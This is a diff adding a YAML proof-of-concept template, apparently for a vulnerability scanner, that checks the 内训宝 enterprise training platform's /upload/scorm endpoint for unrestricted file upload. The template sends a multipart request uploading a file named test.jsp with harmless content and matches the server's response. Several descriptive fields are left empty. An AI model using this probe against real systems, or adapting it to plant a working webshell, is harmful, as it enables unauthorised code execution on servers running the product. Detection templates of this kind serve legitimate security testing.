@@ -1,0 +1,30 @@
+id:
+
+info:
+  name: 内训宝企业培训平台 upload_scorm 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /upload/scorm
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Accept: "*/*"
+    Connection: close
+  data: |
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Content-Disposition: form-data; name="fileupload"; filename="test.jsp"
+    Content-Type: application/octet-stream
+
+    123456
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+response1:
+  headers:
+  body: upload/imgdefault
+  code: 200
+requests2:
+response2:
